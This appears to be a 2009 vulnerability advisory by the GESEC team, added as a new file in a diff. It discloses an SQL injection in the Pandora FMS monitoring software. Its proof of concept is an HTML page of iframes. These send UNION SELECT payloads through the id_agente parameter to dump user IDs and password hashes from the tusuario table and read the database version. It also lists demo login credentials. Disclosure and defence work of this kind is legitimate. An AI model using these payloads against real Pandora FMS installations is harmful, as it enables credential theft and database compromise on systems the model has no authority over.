@@ -1,0 +1,137 @@
+
+PenTest Information:
+====================
+GESEC Team(~smash & ~rem0ve) discover a SQL Injection Vulnerability on Pandora FMS Monitoring Software.
+Attackers can manipulate the application DBMS over a remote sql-injection vulnerability.
+
+
+
+Details
+=======
+Tested on OS:			UBUNTU 5.4
+Tested with Software:		Mozilla Firefox 3.5.6
+
+Vulnerable Products: 		Pandora FMS Monitoring Application
+Affected Versions: 		v2.1.x & v3.x
+Vulnerability Type:		SQL-Injection
+Security-Risk: 			Critical
+
+Vendor-URL: 			http://pandorafms.org/
+Source-URL:			http://pandorafms.org/index.php?sec=project&sec2=downloads&lang=en
+
+Vendor-Status: 			Not Informed
+Patch/Fix-Status:		Fixed version not released
+Advisory-Status:		Published | 20.12.2009
+
+UNPUBLIC Advisory-URL:		*
+  PUBLIC Advisory-URL:		*
+
+
+GE DB-ID:			820
+CVE-ID:				()
+OSVDB-ID:			()
+
+
+
+Introduction
+============
+Pandora FMS is a monitoring Open Source software. It watches your systems and applications, and allows you to 
+know the status of any element of those systems. Pandora FMS could detect a network interface down, a defacement 
+in your website, a memory leak in one of your server application, or the movement of any value of the NASDAQ 
+new technology market. 
+
+    * Detect new systems in network.
+    * Checks for availability or performance.
+    * Raise alerts when something goes wrong.
+    * Allow to get data inside systems with its own lite agents (for almost every Operating System).
+    * Allow to get data from outside, using only network probes. Including SNMP.
+    * Get SNMP Traps from generic network devices. 
+    * Generate real time reports and graphics.
+    * SLA reporting.
+    * User defined graphical views.
+    * Store data for months, ready to be used on reporting.
+    * Real time graphs for every module. 
+    * High availability for each component.
+    * Scalable and modular architecture.
+    * Supports up to 2500 modules per server.
+    * User defined alerts. Also could be used to react on incidents.
+    * Integrated incident manager.
+    * Integrated DB management: purge and DB compaction. 
+    * Multiuser, multi profile, multi group.
+    * Event system with user validation for operation in teams.
+    * Granularity of accesses and user profiles for each group and each user.
+    * Profiles could be personalized using up to eight security attributes without limitation on groups or profiles. 
+
+Pandora FMS runs on any operating system, with specific agents for each platform, gathering data and sending it to a 
+server, it has specific agents for GNU/Linux, AIX, Solaris, HP-UX, BSD/IPSO, and Windows 2000, XP and 2003.
+
+Demo:		http://artica.homelinux.com/pandora/index.php    (demo:demo)
+
+(Copy from the Vendor's Homepage: http://pandorafms.org/index.php?sec=project&sec2=home&lang=en)
+
+
+
+More Details
+============
+Attackers can execute SQL statements over the a not secured statement.
+
+Vulnerable Modules:
+			[+] Pandora Agents > Agent General information
+
+
+Path:			/pandora/
+File:			index.php
+Para:			?sec=estado&sec2=operation/agentes/ver_agente&id_agente=
+
+
+[+] Screen:
+			http://img138.imageshack.us/img138/6229/sql1.png
+			http://img138.imageshack.us/img138/9047/sql2.png
+
+
+
+Proof of Concept
+================
+The vulnerability can be exploited by attackers ...
+
+<html><head><body>
+<title>Pandora FMS Monitoring Application - v2.1.x & v3.x - SQL Injection Exploit</title>
+<br><br>
+<b>HASH</b>
+<iframe src=http://127.0.0.1:8080/pandora/index.php?sec=estado&sec2=operation/agentes/ver_agente&id_agente=1%20union%20select%201,concat_ws%280x3a,id_usuario,password%29,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18%20FROM%20tusuario%20order%20by%202 width=500 height=500>
+<br><br>
+<b>VERSION</b>
+<iframe src=http://127.0.0.1:8080/pandora/index.php?sec=estado&sec2=operation/agentes/ver_agente&id_agente=1%20union%20select%201,@@version,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18%20order%20by%202 width=500 height=500>
+</body></head></html>
+
+
+References:
+http://127.0.0.1:8080/pandora/index.php?sec=estado&sec2=operation/agentes/ver_agente&id_agente=1%20union%20select%201,concat_ws%280x3a,id_usuario,password%29,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18%20FROM%20tusuario%20order%20by%202
+
+http://127.0.0.1:8080/pandora/index.php?sec=estado&sec2=operation/agentes/ver_agente&id_agente=1%20union%20select%201,@@version,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18%20order%20by%202
+
+
+
+Fix or Patch
+============
+Use a prepared statement to fix the sql vulnerability on pandora monitoring.
+
+
+
+Security Risk
+=============
+Attacks can compromise the application(DBMS) over a sql-injection through a not secure statement implementation.
+The security risk of the sql vulnerability is estimated as critical.
+
+
+
+Author
+=======
+The author & writer is part of "Global-Evolution" Security(GESEC). 
+GESEC Vulnerability-Research Team protects software, services, applications & informs the vendors on a secured base.
+  ________.__        ___.          .__            ___________           .__          __  .__               
+ /  _____/|  |   ____\_ |__ _____  |  |           \_   _____/__  ______ |  |  __ ___/  |_|__| ____   ____  
+/   \  ___|  |  /  _ \| __ \\__  \ |  |    ______  |    __)_\  \/ /  _ \|  | |  |  \   __\  |/  _ \ /    \ (c)
+\    \_\  \  |_(  <_> ) \_\ \/ __ \|  |__ /_____/  |        \\   (  <_> )  |_|  |  /|  | |  (  <_> )   |  \
+ \______  /____/\____/|___  (____  /____/         /_______  / \_/ \____/|____/____/ |__| |__|\____/|___|  /
+        \/                \/     \/                       \/                                            \/ 
